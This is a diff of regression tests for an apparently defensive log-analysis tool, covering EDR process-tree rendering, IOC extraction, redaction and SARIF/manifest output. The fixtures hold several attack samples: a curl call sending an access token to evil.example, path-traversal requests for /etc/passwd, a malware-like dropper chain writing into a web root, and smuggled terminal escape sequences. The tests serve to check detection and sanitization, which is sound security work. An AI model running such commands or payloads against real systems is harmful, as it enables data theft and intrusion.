@@ -94,6 +94,70 @@ class OutputRegressionTests(unittest.TestCase):
         self.assertIn("data:image/png;base64,", html)
         self.assertNotIn("bla/output/assets/bla-logo.png", html)
 
+    def test_terminal_report_renders_edr_tree_and_multiline_timeline(self):
+        content = "\n".join([
+            "\t".join([
+                "事件类型", "事件子类型", "时间", "进程用户名", "进程名",
+                "进程映像路径", "进程文件签名", "进程事件文件路径",
+                "目标进程文件签名", "文件类型", "文件大小", "进程命令",
+            ]),
+            "\t".join([
+                "进程事件", "进程创建", "2026-01-21 12:27:00", "Administrator",
+                "Explorer.EXE", r"C:\windows\Explorer.EXE", "Microsoft Windows",
+                r"C:\Program Files\7-Zip\7zG.exe", "", "exe", "553984",
+                r'"C:\Program Files\7-Zip\7zG.exe" x -o"C:\Users\Administrator\Downloads\TencentttMeeti5681\" -spe',
+            ]),
+            "\t".join([
+                "进程事件", "进程创建", "2026-01-21 12:27:59", "Administrator",
+                "Explorer.EXE", r"C:\windows\Explorer.EXE", "Microsoft Windows",
+                r"C:\Users\Administrator\Downloads\TencentttMeeti5681\TencentttMeeti5681.exe",
+                "", "exe", "299556187",
+                r'"C:\Users\Administrator\Downloads\TencentttMeeti5681\TencentttMeeti5681.exe"',
+            ]),
+            "\t".join([
+                "进程事件", "进程创建", "2026-01-21 12:27:59", "Administrator",
+                "TencentttMeeti5681.exe",
+                r"C:\Users\Administrator\Downloads\TencentttMeeti5681\TencentttMeeti5681.exe",
+                "", r"C:\Users\Administrator\Downloads\TencentttMeeti5681\II-10.exe",
+                "", "exe", "24420072",
+                r'"C:\Users\Administrator\Downloads\TencentttMeeti5681\II-10.exe"',
+            ]),
+            "\t".join([
+                "进程事件", "进程创建", "2026-01-21 12:27:59", "Administrator",
+                "II-10.exe",
+                r"C:\Users\Administrator\Downloads\TencentttMeeti5681\II-10.exe",
+                "", r"C:\Users\ADMINI~1\AppData\Local\Temp\is-TED13.tmp\II-10.tmp",
+                "", "tmp", "0",
+                r'"C:\Users\ADMINI~1\AppData\Local\Temp\is-TED13.tmp\II-10.tmp"',
+            ]),
+            "\t".join([
+                "进程事件", "进程创建", "2026-01-21 12:27:59", "Administrator",
+                "II-10.tmp",
+                r"C:\Users\ADMINI~1\AppData\Local\Temp\is-TED13.tmp\II-10.tmp",
+                "", r"C:\inetpub\wwwroot\rMmZhp\ewWB4p\g36Q6KT.exe",
+                "", "exe", "5593032",
+                r'"C:\inetpub\wwwroot\rMmZhp\ewWB4p\g36Q6KT"',
+            ]),
+        ])
+        result = parse_content(content, "edr-export.tsv", parser_name="edr-xlsx")
+        summary = run_detection(result.events)
+
+        buf = io.StringIO()
+        with mock.patch("sys.stdout", buf):
+            print_terminal_report([result], summary, no_color=True, max_alerts=10)
+        terminal = buf.getvalue()
+        tree = terminal.split("EDR 进程链:", 1)[1].split("建议补采:", 1)[0]
+
+        self.assertIn("EDR 进程链:", terminal)
+        self.assertIn("Explorer.EXE", terminal)
+        self.assertIn("└─ TencentttMeeti5681.exe", terminal)
+        self.assertIn("II-10.tmp", terminal)
+        self.assertIn("C:\\inetpub\\wwwroot\\rMmZhp\\ewWB4p\\g36Q6KT.exe", terminal)
+        self.assertNotIn(r"C:\Users\Administrator\Downloads\TencentttMeeti5681\TencentttMeeti5681.exe", tree)
+        self.assertNotIn(r"C:\Users\Administrator\Downloads\TencentttMeeti5681\II-10.exe", tree)
+        self.assertIn("路径:", terminal)
+        self.assertIn("命令:", terminal)
+
     def test_html_report_renders_geo_map_from_local_geoip_cache(self):
         """HTML 地图只使用本地 GeoIP 缓存，并按国家/地区聚合公网源 IP。"""
         events = [
@@ -337,6 +401,33 @@ class OutputRegressionTests(unittest.TestCase):
         self.assertIn("access_token=<redacted>", report)
         self.assertIn("Authorization=<redacted>", report)
 
+    def test_extract_iocs_returns_sanitized_values(self):
+        event = LogEvent(
+            id="ioc-structured",
+            timestamp="2024-03-15T10:00:00",
+            level=ThreatLevel.HIGH,
+            category="测试",
+            source="fixture",
+            source_file="access.log",
+            message=f"{BAD_TERMINAL_SEGMENT} curl http://evil.example/a?access_token=super-secret",
+            raw_line=f"{BAD_TERMINAL_SEGMENT} curl http://evil.example/a?access_token=super-secret",
+            user=BAD_TERMINAL_SEGMENT,
+            process=f"powershell {BAD_TERMINAL_SEGMENT}",
+            details={"command": "curl http://evil.example/a?access_token=super-secret"},
+            tags=["rce"],
+        )
+
+        iocs = extract_iocs([event])
+        combined = _json.dumps(iocs, ensure_ascii=False)
+
+        self.assertNotIn("\x1b", combined)
+        self.assertNotIn("\x07", combined)
+        self.assertNotIn("SGVsbG8", combined)
+        self.assertNotIn("super-secret", combined)
+        self.assertIn("access_token=<redacted>", combined)
+        self.assertIn("token=<redacted>", combined)
+        self.assertIn("evil.example", iocs["domains"])
+
     def test_terminal_report_can_cap_large_alert_lists(self):
         content = "".join(
             "%d.0.0.1 - - [15/Mar/2024:10:00:00 +0800] "
@@ -561,6 +652,119 @@ class OutputRegressionTests(unittest.TestCase):
         uri = data["runs"][0]["results"][0]["locations"][0]["physicalLocation"]["artifactLocation"]["uri"]
         self.assertEqual(uri, "first.log")
 
+    def test_sarif_rejects_untrusted_mitre_help_uri(self):
+        safe_alert = DetectionAlert(
+            id="a-safe",
+            rule_id="TEST-SAFE",
+            rule_name="safe mitre",
+            description="safe",
+            level=ThreatLevel.HIGH,
+            category="测试",
+            mitre_attack="T1003.001",
+            mitre_phase="凭据访问",
+            affected_events=[],
+            evidence=[],
+            recommendation="review",
+            timestamp="2024-03-15T10:00:00",
+            confidence="high",
+        )
+        bad_mitre = f"T1059.access_token=super-secret{BAD_TERMINAL_SEGMENT}"
+        bad_alert = DetectionAlert(
+            id="a-bad",
+            rule_id="TEST-BAD",
+            rule_name="bad mitre",
+            description="bad",
+            level=ThreatLevel.HIGH,
+            category="测试",
+            mitre_attack=bad_mitre,
+            mitre_phase="执行",
+            affected_events=[],
+            evidence=[],
+            recommendation="review",
+            timestamp="2024-03-15T10:01:00",
+            confidence="high",
+        )
+        summary = AnalysisSummary(
+            risk_score=0,
+            risk_level=ThreatLevel.INFO,
+            alerts=[safe_alert, bad_alert],
+            timeline=[],
+            attack_chain=[],
+            recommendations=[],
+            total_events=0,
+            files_analyzed=0,
+        )
+
+        with tempfile.TemporaryDirectory() as tmp:
+            sarif_path = Path(tmp) / "report.sarif"
+            generate_sarif_report([], summary, str(sarif_path))
+            text = sarif_path.read_text(encoding="utf-8")
+            data = _json.loads(text)
+
+        rules = {rule["id"]: rule for rule in data["runs"][0]["tool"]["driver"]["rules"]}
+        self.assertEqual(
+            rules["TEST-SAFE"]["helpUri"],
+            "https://attack.mitre.org/techniques/T1003/001",
+        )
+        self.assertEqual(rules["TEST-BAD"]["helpUri"], "")
+        self.assertNotIn("\x1b", text)
+        self.assertNotIn("\x07", text)
+        self.assertNotIn("SGVsbG8", text)
+        self.assertNotIn("super-secret", text)
+        self.assertIn("access_token=<redacted>", text)
+
+    def test_sarif_remote_artifact_uri_sanitizes_path(self):
+        source_file = f"host01:/var/log/{BAD_TERMINAL_SEGMENT}.log"
+        event = LogEvent(
+            id="e-remote",
+            timestamp="2024-03-15T10:00:00",
+            level=ThreatLevel.HIGH,
+            category="测试",
+            source="fixture",
+            source_file=source_file,
+            message="remote event",
+            raw_line="remote event",
+        )
+        alert = DetectionAlert(
+            id="a-remote",
+            rule_id="TEST-REMOTE",
+            rule_name="远程路径清洗",
+            description="remote artifact",
+            level=ThreatLevel.HIGH,
+            category="测试",
+            mitre_attack="T1190",
+            mitre_phase="初始访问",
+            affected_events=[event.id],
+            evidence=[],
+            recommendation="review remote artifact",
+            timestamp=event.timestamp,
+            confidence="high",
+        )
+        result = ParseResult(source_file, "Fixture", [event], ParseStats(total=1, high=1))
+        summary = AnalysisSummary(
+            risk_score=0,
+            risk_level=ThreatLevel.INFO,
+            alerts=[alert],
+            timeline=[],
+            attack_chain=[],
+            recommendations=[],
+            total_events=1,
+            files_analyzed=1,
+        )
+
+        with tempfile.TemporaryDirectory() as tmp:
+            sarif_path = Path(tmp) / "report.sarif"
+            generate_sarif_report([result], summary, str(sarif_path))
+            text = sarif_path.read_text(encoding="utf-8")
+            data = _json.loads(text)
+
+        uri = data["runs"][0]["results"][0]["locations"][0]["physicalLocation"]["artifactLocation"]["uri"]
+        self.assertEqual(uri, "remote/host01/var/log/token=<redacted>")
+        self.assertNotIn("\x1b]52", text)
+        self.assertNotIn("\x07", text)
+        self.assertNotIn("SGVsbG8", text)
+        self.assertNotIn("super-secret", text)
+
     def test_ioc_drops_boring_paths_but_keeps_attack_paths(self):
         """IOC 路径列表只保留有意义的路径，过滤 / 和 /index.html 这类噪音。"""
         content = (
@@ -624,6 +828,149 @@ class OutputRegressionTests(unittest.TestCase):
             self.assertEqual(manifest["schema"], "bla-report-manifest-v1")
             self.assertEqual(len(manifest["outputs"]), 5)
             self.assertEqual(manifest["summary"]["alert_count"], len(summary.alerts))
+
+    def test_run_analysis_bundle_manifest_hashes_local_inputs_without_absolute_paths(self):
+        content = (
+            "9.9.9.9 - - [15/Mar/2024:10:01:00 +0800] "
+            "\"GET /download.php?file=../../etc/passwd HTTP/1.1\" 200 10 \"-\" \"curl/8\"\n"
+        )
+        expected_hash = __import__("hashlib").sha256(content.encode()).hexdigest()
+
+        with tempfile.TemporaryDirectory() as tmp:
+            root = Path(tmp)
+            input_path = root / "access.log"
+            out_dir = root / "report"
+            input_path.write_text(content, encoding="utf-8")
+
+            run_analysis(
+                AnalysisOptions(
+                    paths=[str(input_path)],
+                    outputs=AnalysisOutputs(bundle_dir=str(out_dir)),
+                )
+            )
+            manifest = _json.loads((out_dir / "manifest.json").read_text(encoding="utf-8"))
+
+        self.assertEqual(manifest["inputs"][0]["name"], "access.log")
+        self.assertEqual(manifest["inputs"][0]["sha256"], expected_hash)
+        self.assertEqual(manifest["inputs"][0]["size_bytes"], len(content.encode()))
+        manifest_text = _json.dumps(manifest, ensure_ascii=False)
+        self.assertNotIn(str(root), manifest_text)
+        self.assertNotIn("absolute_path", manifest["inputs"][0])
+
+    def test_cli_bundle_manifest_disambiguates_duplicate_basenames(self):
+        content_a = (
+            "9.9.9.9 - - [15/Mar/2024:10:00:00 +0800] "
+            "\"GET /admin.php HTTP/1.1\" 404 10 \"-\" \"curl/8\"\n"
+        )
+        content_b = (
+            "198.51.100.10 - - [15/Mar/2024:10:00:01 +0800] "
+            "\"GET /download.php?file=../../etc/passwd HTTP/1.1\" 200 10 \"-\" \"Mozilla/5.0\"\n"
+        )
+
+        with tempfile.TemporaryDirectory() as tmp:
+            root = Path(tmp)
+            host_a = root / "host-a"
+            host_b = root / "host-b"
+            out_dir = root / "report"
+            host_a.mkdir()
+            host_b.mkdir()
+            (host_a / "access.log").write_text(content_a, encoding="utf-8")
+            (host_b / "access.log").write_text(content_b, encoding="utf-8")
+
+            completed = subprocess.run(
+                [
+                    sys.executable,
+                    "bla_cli.py",
+                    str(host_a / "access.log"),
+                    str(host_b / "access.log"),
+                    "--out",
+                    str(out_dir),
+                    "--exit-on",
+                    "none",
+                    "--no-color",
+                    "--max-alerts",
+                    "0",
+                ],
+                cwd=Path(__file__).parents[1],
+                text=True,
+                encoding="utf-8",
+                errors="replace",
+                capture_output=True,
+                check=False,
+            )
+            manifest = _json.loads((out_dir / "manifest.json").read_text(encoding="utf-8"))
+
+        self.assertEqual(completed.returncode, 0, completed.stderr)
+        input_names = {item["name"] for item in manifest["inputs"]}
+        parsed_names = {item["name"] for item in manifest["parsed_files"]}
+        self.assertEqual(input_names, {"host-a/access.log", "host-b/access.log"})
+        self.assertEqual(parsed_names, input_names)
+        self.assertEqual(manifest["summary"]["files_analyzed"], 2)
+        for item in manifest["inputs"]:
+            self.assertEqual(len(item["sha256"]), 64)
+            self.assertFalse(Path(item["name"]).is_absolute())
+        manifest_text = _json.dumps(manifest, ensure_ascii=False)
+        self.assertNotIn(str(root), manifest_text)
+        self.assertNotIn("absolute_path", manifest_text)
+
+    def test_cli_manifest_options_use_safe_path_labels(self):
+        content = (
+            "9.9.9.9 - - [15/Mar/2024:10:01:00 +0800] "
+            "\"GET /download.php?file=../../etc/passwd HTTP/1.1\" 200 10 \"-\" \"curl/8\"\n"
+        )
+
+        with tempfile.TemporaryDirectory() as tmp:
+            root = Path(tmp)
+            secret_root = root / BAD_FILESYSTEM_SEGMENT
+            secret_root.mkdir()
+            input_path = root / "access.log"
+            out_dir = root / "report"
+            config_path = secret_root / "thresholds.json"
+            allowlist_path = secret_root / "allowlist.json"
+            rules_dir = secret_root / "rules-token=super-secret"
+            input_path.write_text(content, encoding="utf-8")
+            config_path.write_text('{"brute_force_min": 5}', encoding="utf-8")
+            allowlist_path.write_text("{}", encoding="utf-8")
+            rules_dir.mkdir()
+
+            completed = subprocess.run(
+                [
+                    sys.executable,
+                    "bla_cli.py",
+                    str(input_path),
+                    "--config",
+                    str(config_path),
+                    "--allowlist",
+                    str(allowlist_path),
+                    "--rules",
+                    str(rules_dir),
+                    "--out",
+                    str(out_dir),
+                    "--exit-on",
+                    "none",
+                    "--no-color",
+                    "--max-alerts",
+                    "0",
+                ],
+                cwd=Path(__file__).parents[1],
+                text=True,
+                encoding="utf-8",
+                errors="replace",
+                capture_output=True,
+                check=False,
+            )
+            manifest = _json.loads((out_dir / "manifest.json").read_text(encoding="utf-8"))
+
+        self.assertEqual(completed.returncode, 0, completed.stderr)
+        options = manifest["options"]
+        self.assertEqual(options["config"], "thresholds.json")
+        self.assertEqual(options["allowlist"], "allowlist.json")
+        self.assertEqual(options["rules"], ["rules-token=<redacted>"])
+        manifest_text = _json.dumps(manifest, ensure_ascii=False)
+        self.assertNotIn(str(root), manifest_text)
+        self.assertNotIn("\x1b", manifest_text)
+        self.assertNotIn("SGVsbG8", manifest_text)
+        self.assertNotIn("super-secret", manifest_text)
 
     def test_report_bundle_sanitizes_terminal_output_paths(self):
         """报告保存提示不得把恶意输出路径中的控制字符或 secret 打到终端。"""
@@ -723,6 +1070,84 @@ class OutputRegressionTests(unittest.TestCase):
         self.assertEqual(data["events"][0]["message"], "password=<redacted>")
         self.assertEqual(len(data["timeline"]), 200)
         self.assertTrue(data["truncation"]["timeline"]["truncated"])
+
+    def test_structured_outputs_sanitize_attacker_controlled_keys_and_refs(self):
+        bad_key = BAD_TERMINAL_SEGMENT
+        expected_key = "token=<redacted>"
+        event = LogEvent(
+            id=bad_key,
+            timestamp="2024-03-15T10:00:00",
+            level=ThreatLevel.HIGH,
+            category="测试",
+            source="fixture",
+            source_file="events.log",
+            message=f"message {bad_key}",
+            raw_line=f"raw {bad_key}",
+            details={bad_key: "detail-value", "normal": "access_token=super-secret"},
+        )
+        alert = DetectionAlert(
+            id="alert-key",
+            rule_id="TEST-KEY",
+            rule_name="结构化输出 key 清洗",
+            description=f"desc {bad_key}",
+            level=ThreatLevel.HIGH,
+            category="测试",
+            mitre_attack="T1003",
+            mitre_phase="凭据访问",
+            affected_events=[event.id],
+            evidence=[f"evidence {bad_key}"],
+            recommendation="review output",
+            timestamp=event.timestamp,
+            confidence="high",
+        )
+        result = ParseResult("events.log", "Fixture", [event], ParseStats(total=1, high=1))
+        summary = AnalysisSummary(
+            risk_score=80,
+            risk_level=ThreatLevel.HIGH,
+            alerts=[alert],
+            timeline=[],
+            attack_chain=[],
+            recommendations=[],
+            total_events=1,
+            files_analyzed=1,
+        )
+
+        with tempfile.TemporaryDirectory() as tmp:
+            tmp_path = Path(tmp)
+            json_path = tmp_path / "report.json"
+            manifest_path = tmp_path / "manifest.json"
+            sarif_path = tmp_path / "report.sarif"
+
+            generate_json_report([result], summary, str(json_path))
+            generate_manifest(
+                [result],
+                summary,
+                str(manifest_path),
+                context={"options": {bad_key: "enabled"}},
+            )
+            generate_sarif_report([result], summary, str(sarif_path))
+
+            json_data = _json.loads(json_path.read_text(encoding="utf-8"))
+            manifest = _json.loads(manifest_path.read_text(encoding="utf-8"))
+            sarif = _json.loads(sarif_path.read_text(encoding="utf-8"))
+            combined_text = "\n".join(
+                path.read_text(encoding="utf-8")
+                for path in (json_path, manifest_path, sarif_path)
+            )
+
+        self.assertIn(expected_key, json_data["events"][0]["details"])
+        self.assertNotIn(bad_key, json_data["events"][0]["details"])
+        self.assertEqual(json_data["events"][0]["details"][expected_key], "detail-value")
+        self.assertEqual(manifest["options"][expected_key], "enabled")
+        self.assertEqual(
+            sarif["runs"][0]["results"][0]["properties"]["affected_events"],
+            [expected_key],
+        )
+        self.assertNotIn("\x1b]52", combined_text)
+        self.assertNotIn("\x07", combined_text)
+        self.assertNotIn("SGVsbG8", combined_text)
+        self.assertNotIn("super-secret", combined_text)
+        self.assertIn(expected_key, combined_text)
 
     def test_json_report_can_limit_or_omit_events_and_raw_lines(self):
         events = [
